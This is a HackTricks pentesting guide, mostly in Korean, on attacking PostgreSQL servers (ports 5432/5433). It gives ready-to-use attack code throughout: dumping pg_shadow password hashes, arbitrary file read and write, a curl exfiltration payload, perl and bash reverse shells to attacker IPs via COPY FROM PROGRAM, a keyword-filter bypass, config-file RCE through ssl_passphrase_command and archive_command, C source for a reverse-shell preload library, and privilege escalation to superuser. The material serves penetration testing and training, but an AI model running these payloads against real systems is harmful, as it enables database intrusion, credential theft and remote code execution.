# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **기본 정보**

**PostgreSQL**는 **객체-관계형 데이터베이스 시스템(object-relational database system)**으로 설명되며 **오픈 소스**입니다. 이 시스템은 SQL 언어를 사용할 뿐만 아니라 추가 기능으로 이를 확장합니다. 다양한 데이터 타입과 연산을 처리할 수 있는 능력을 가지고 있어 개발자와 조직에 유연한 선택이 됩니다.

**기본 포트:** 5432. 이 포트가 이미 사용 중이면 postgresql은 사용되지 않은 다음 포트(보통 5433)를 사용하는 것으로 보입니다.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## 연결 & 기본 Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> 만약 **`\list`** 를 실행했을 때 **`rdsadmin`** 라는 데이터베이스가 보이면, 해당 인스턴스가 **AWS postgresql database** 임을 알 수 있습니다.

PostgreSQL database를 악용하는 방법에 대한 자세한 내용은 **PostgreSQL database를 악용하는 방법**을 확인하세요:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## 자동 열거
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

[**this research**](https://www.exploit-db.com/papers/13084)에 따르면, 연결 시도가 실패하면 `dblink`는 오류에 대한 설명을 포함하는 `sqlclient_unable_to_establish_sqlconnection` 예외를 발생시킵니다. 이러한 상세 정보의 예는 아래에 나열되어 있습니다.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- 호스트가 다운됨

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- 포트가 닫혀 있음
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port가 열려 있음
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
또는
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port는 open 또는 filtered 상태입니다
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL 함수에서는 현재 예외 상세 정보를 얻을 수 없습니다. 그러나 PostgreSQL 서버에 직접 접근할 수 있다면 필요한 정보를 가져올 수 있습니다. 시스템 테이블에서 사용자명과 비밀번호를 추출할 수 없다면, 앞 섹션에서 설명한 wordlist attack 방법을 고려해볼 수 있으며, 이는 성공할 가능성이 있습니다.

## 권한 열거

### Roles

| 역할 유형       |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | 역할이 superuser 권한을 가짐                                                                                                                          |
| rolinherit     | 해당 역할이 속한 역할의 권한을 자동으로 상속함                                                                                                        |
| rolcreaterole  | 새 역할을 생성할 수 있음                                                                                                                             |
| rolcreatedb    | 데이터베이스를 생성할 수 있음                                                                                                                        |
| rolcanlogin    | 로그인할 수 있음. 즉, 이 역할을 세션 초기 권한 식별자로 지정할 수 있음                                                                                 |
| rolreplication | 복제 역할임. 복제 역할은 복제 연결을 시작하고 replication slots을 생성 및 삭제할 수 있음.                                                           |
| rolconnlimit   | 로그인 가능한 역할에 대해 이 값은 해당 역할이 만들 수 있는 동시 연결의 최대 수를 설정함. -1은 제한 없음.                                                 |
| rolpassword    | 비밀번호가 아님 (항상 `********`로 표시됨)                                                                                                            |
| rolvaliduntil  | 비밀번호 만료 시간 (비밀번호 인증에만 사용); 만료가 없으면 null                                                                                         |
| rolbypassrls   | 역할이 모든 row-level security 정책을 우회함. 자세한 내용은 [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) 참조. |
| rolconfig      | 런타임 구성 변수에 대한 역할별 기본값                                                                                                                  |
| oid            | 역할의 ID                                                                                                                                           |

#### Interesting Groups

- If you are a member of **`pg_execute_server_program`** you can **execute** programs
- If you are a member of **`pg_read_server_files`** you can **read** files
- If you are a member of **`pg_write_server_files`** you can **write** files

> [!TIP]
> Postgres에서 **user**, **group** 및 **role**은 **같습니다**. 이는 단지 **어떻게 사용하는지**와 **로그인하도록 허용하는지**에 달려 있습니다.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### 테이블
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### 함수
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## 파일 시스템 작업

### 디렉터리 및 파일 읽기

이 [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)에 따르면 정의된 **`DEFAULT_ROLE_READ_SERVER_FILES`** 그룹(이름 **`pg_read_server_files`**)의 구성원과 **super users**는 모든 경로에 대해 **`COPY`** 메서드를 사용할 수 있습니다(`genfile.c`의 `convert_and_check_filename`를 확인하세요):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> 만약 당신이 super user가 아니지만 **CREATEROLE** 권한을 가지고 있다면 해당 그룹의 멤버로 **자신을 추가할 수 있습니다:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

파일을 읽거나 디렉토리를 나열하는 데 사용할 수 있는 **다른 postgres 함수들**이 있습니다. 오직 **superusers**와 **명시적 권한을 가진 사용자들**만 이를 사용할 수 있습니다:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
다음에서 **더 많은 함수**를 확인할 수 있습니다: [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### 간단한 파일 쓰기

오직 **슈퍼유저**와 **`pg_write_server_files`**의 구성원만 copy를 사용하여 파일을 쓸 수 있습니다.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> 자신이 슈퍼유저가 아니지만 **`CREATEROLE`** 권한이 있다면 해당 그룹의 멤버로 만들 수 있다는 점을 기억하세요:
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

COPY는 newline 문자를 처리할 수 없으므로, base64 페이로드를 사용하더라도 **한 줄(one-liner)** 로 전송해야 합니다.\
이 기법의 매우 중요한 제한점은 **`copy`는 일부 바이너리 값을 변경하므로 바이너리 파일을 쓰는 데 사용할 수 없습니다.**

### **Binary files upload**

그러나 큰 바이너리 파일을 업로드하는 **다른 기법들**이 존재합니다:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Updating PostgreSQL table data via local file write

PostgreSQL 서버 파일을 읽고 쓸 수 있는 권한이 있다면, [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html)에서 **연관된 filenode를 덮어써서** 서버의 어떤 테이블이든 업데이트할 수 있습니다. 이 기법에 대한 **자세한 내용은** [**여기**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)를 참고하세요.

필요한 단계:

1.  PostgreSQL 데이터 디렉터리 확인

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**참고:** 설정에서 현재 데이터 디렉터리 경로를 가져올 수 없다면, `SELECT version()` 쿼리로 주요 PostgreSQL 버전을 조회하고 경로를 브루트포스해볼 수 있습니다. Unix에 설치된 PostgreSQL의 일반적인 데이터 디렉터리 경로는 `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/` 입니다. 일반적인 클러스터 이름은 `main` 입니다.

2.  대상 테이블에 연결된 filenode의 상대 경로 얻기

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

이 쿼리는 `base/3/1337` 같은 값을 반환해야 합니다. 디스크상의 전체 경로는 `$DATA_DIRECTORY/base/3/1337`, 예: `/var/lib/postgresql/13/main/base/3/1337` 입니다.

3.  `lo_*` 함수로 filenode 다운로드

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  대상 테이블과 연관된 데이터타입 획득

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)를 사용하여 [filenode를 편집](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)합니다; 전체 권한을 위해 모든 `rol*` 불리언 플래그를 1로 설정하세요.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  편집한 filenode를 `lo_*` 함수로 다시 업로드하고 디스크의 원본 파일을 덮어씁니다

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(선택)_ 비싼 SQL 쿼리를 실행하여 메모리상의 테이블 캐시를 지웁니다

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  이제 PostgreSQL에서 업데이트된 테이블 값을 확인할 수 있습니다.

`pg_authid` 테이블을 편집하여 슈퍼어드민이 될 수도 있습니다. **자세한 내용은** [**다음 섹션**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)을 참조하세요.

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
exec 예제:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> 기억하세요: 만약 당신이 슈퍼유저가 아니지만 **`CREATEROLE`** 권한을 가지고 있다면 자신을 해당 그룹의 멤버로 **만들 수 있습니다:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### 키워드 필터/WAF를 우회해 COPY PROGRAM에 접근하기

In SQLi contexts with stacked queries, a WAF may remove or block the literal keyword `COPY`. You can dynamically construct the statement and execute it inside a PL/pgSQL DO block. For example, build the leading C with `CHR(67)` to bypass naive filters and EXECUTE the assembled command:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
이 패턴은 정적 키워드 필터링을 회피하면서도 `COPY ... PROGRAM`을 통해 OS 명령 실행을 달성합니다. 애플리케이션이 SQL 오류를 출력하고 stacked queries를 허용할 때 특히 유용합니다.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

이전 포스트에서 **how to upload binary files**를 **배운** 경우, **postgresql extension을 업로드하고 로드하여 RCE를 얻어볼 수 있습니다.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> 다음 RCE 벡터들은 제한된 SQLi 환경에서 특히 유용합니다. 모든 단계가 중첩된 SELECT 문을 통해 수행될 수 있기 때문입니다.

PostgreSQL의 **구성 파일**은 데이터베이스를 실행하는 계정인 **postgres user**에 의해 **쓰기 가능**합니다. 즉, **superuser** 권한으로 파일시스템에 파일을 쓸 수 있으므로 이 파일을 **덮어쓸 수 있습니다.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

구성 파일에는 RCE로 이어질 수 있는 몇 가지 흥미로운 속성이 있습니다:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.

그렇다면 공격자는 다음을 수행해야 합니다:

1. **Dump private key** from the server
2. **Encrypt** downloaded private key:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** the current postgresql **configuration**
5. **Overwrite** the **configuration** with the mentioned attributes configuration:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

테스트 중에 이 방법은 **private key file has privileges 640**이고, **owned by root**이며 **group ssl-cert or postgres**(그래서 postgres 사용자가 읽을 수 있음)에 속해 있고, _/var/lib/postgresql/12/main_에 위치한 경우에만 작동한다는 것을 알았습니다.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

구성 파일에서 악용 가능한 또 다른 속성은 `archive_command`입니다.

이를 작동시키려면 `archive_mode` 설정이 `'on'` 또는 `'always'`여야 합니다. 이 조건이 참이면 `archive_command`의 명령을 덮어쓰고 WAL(write-ahead logging) 작업을 통해 실행되도록 강제할 수 있습니다.

일반적인 단계는 다음과 같습니다:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

여러 줄 쓰기가 필요할 때(예: 여러 GUCs를 설정할 때), PostgreSQL Large Objects를 사용하여 SQL로 구성 파일을 읽고 전체를 덮어쓰세요. 이 방식은 `COPY`가 줄바꿈 또는 바이너리 안전 쓰기를 처리하지 못하는 SQLi 환경에서 이상적입니다.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
이것은 `archive_mode`가 활성화되어 있는 경우 `postgres` 사용자로서 `archive_command`를 통해 신뢰할 수 있는 OS 명령 실행을 제공합니다. 실제로 `archive_timeout`을 낮게 설정하면 명시적인 WAL 스위치 없이도 빠르게 호출되도록 만들 수 있습니다.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

이 공격 벡터는 다음 구성 변수들을 악용합니다:

- `session_preload_libraries` -- 클라이언트 연결 시 PostgreSQL 서버가 로드할 라이브러리입니다.
- `dynamic_library_path` -- PostgreSQL 서버가 라이브러리를 검색할 디렉터리 목록입니다.

`dynamic_library_path` 값을 데이터베이스를 실행하는 `postgres` 사용자가 쓸 수 있는 디렉터리(예: `/tmp/`)로 설정하고, 그곳에 악성 `.so` 객체를 업로드할 수 있습니다. 그런 다음 `session_preload_libraries` 변수에 해당 라이브러리 이름을 포함시켜 PostgreSQL 서버가 새로 업로드한 라이브러리를 로드하도록 강제합니다.

공격 단계는 다음과 같습니다:

1. 원본 `postgresql.conf`를 다운로드합니다.
2. `dynamic_library_path` 값에 `/tmp/` 디렉터리를 포함시킵니다. 예: `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries` 값에 악성 라이브러리 이름을 포함시킵니다. 예: `session_preload_libraries = 'payload.so'`
4. `SELECT version()` 쿼리로 주요 PostgreSQL 버전을 확인합니다.
5. 적절한 PostgreSQL dev 패키지로 악성 라이브러리 코드를 컴파일합니다. 샘플 코드:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. 2~3단계에서 생성한 악성 `postgresql.conf`를 업로드하여 원본을 덮어씁니다.
7. 5단계에서 생성한 `payload.so`를 `/tmp` 디렉터리에 업로드합니다.
8. 서버를 재시작하거나 `SELECT pg_reload_conf()` 쿼리를 실행하여 서버 설정을 다시 로드합니다.
9. 다음 DB 연결 시 리버스 셸 연결을 받게 됩니다.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

다음 [**docs**](https://www.postgresql.org/docs/13/sql-grant.html)에 따르면: _`CREATEROLE` 권한을 가진 역할은 **슈퍼유저가 아닌** 모든 역할에 대한 **멤버십을 부여하거나 취소할 수 있습니다**._

따라서 **`CREATEROLE`** 권한이 있으면 자신에게 다른 **roles**(슈퍼유저가 아닌)에 대한 접근 권한을 부여하여 파일 읽기/쓰기 및 명령 실행 옵션을 얻을 수 있습니다:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### 비밀번호 변경

이 역할이 있는 사용자는 다른 **슈퍼유저가 아닌** 사용자의 **비밀번호를** **변경**할 수도 있습니다:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

**로컬 사용자가 비밀번호 없이 PostgreSQL에 로그인할 수 있는 경우를 흔히 발견합니다.** 따라서, 일단 **코드 실행 권한**을 확보하면 이러한 권한을 악용해 **`SUPERUSER`** 역할을 얻을 수 있습니다:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> 이는 일반적으로 **`pg_hba.conf`** 파일에 다음과 같은 라인이 있기 때문에 가능합니다:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)에서는 사용자에게 부여된 ALTER TABLE 권한을 악용해 Postgres GCP에서 어떻게 **privesc**가 가능했는지 설명합니다.

일반적으로 **다른 사용자를 테이블 소유자로 만들기**를 시도하면 이를 방지하는 **오류**가 발생해야 하지만, GCP에서는 **superuser가 아닌 postgres 사용자**에게 그 **옵션**을 부여한 것으로 보입니다:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

이와 더불어, **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) 명령이 **index function이 있는 테이블**에서 실행될 때, 해당 **function**은 명령의 일부로 호출되어 **테이블 소유자 권한**으로 실행됩니다. 함수로 인덱스를 생성하고 해당 테이블의 소유자 권한을 **super user**에게 부여한 뒤, 악성 함수를 가진 테이블에 대해 ANALYZE를 실행하면 소유자의 권한으로 명령을 실행할 수 있게 됩니다.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. 새 테이블을 생성하는 것부터 시작합니다.
2. index function에 사용할 데이터를 제공하기 위해 테이블에 무관한 내용을 몇 개 삽입합니다.
3. 악성 index function을 작성하여 code execution payload를 포함시키고, 이를 통해 권한 없는 명령을 실행할 수 있게 합니다.
4. 테이블 소유자를 "cloudsqladmin"으로 ALTER합니다. 이는 Cloud SQL이 데이터베이스를 관리 및 유지하기 위해 전용으로 사용하는 GCP의 superuser 역할입니다.
5. 테이블에 대해 ANALYZE를 실행합니다. 이 동작은 PostgreSQL 엔진이 테이블 소유자 "cloudsqladmin"의 사용자 컨텍스트로 전환하게 만듭니다. 결과적으로 악성 index function이 "cloudsqladmin" 권한으로 호출되어 이전에 권한이 없던 shell command를 실행할 수 있게 됩니다.

PostgreSQL에서는 이 흐름이 대략 다음과 같이 진행됩니다:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
그러면 `shell_commands_results` 테이블에는 실행된 코드의 출력이 포함됩니다:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### 로컬 로그인

일부 잘못 구성된 postgresql 인스턴스는 모든 로컬 사용자의 로그인을 허용할 수 있으며, 127.0.0.1에서 **`dblink` 함수**를 사용해 로컬로 접속할 수 있습니다:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> 이전 쿼리가 작동하려면 **함수 `dblink`가 존재해야 합니다**. 존재하지 않는다면 다음 명령으로 생성해 볼 수 있습니다
>
> ```sql
> CREATE EXTENSION dblink;
> ```

더 높은 권한을 가진 사용자의 비밀번호를 알고 있지만 해당 사용자가 외부 IP에서 로그인할 수 없는 경우, 다음 함수를 사용해 그 사용자로서 쿼리를 실행할 수 있습니다:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
다음 명령으로 이 함수가 존재하는지 확인할 수 있습니다:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **SECURITY DEFINER를 가진 사용자 정의 함수**

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters는 IBM이 제공한 postgres 인스턴스에서 privesc에 성공했는데, 그 이유는 그들이 **SECURITY DEFINER 플래그가 설정된 이 함수를 발견했기 때문**입니다:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

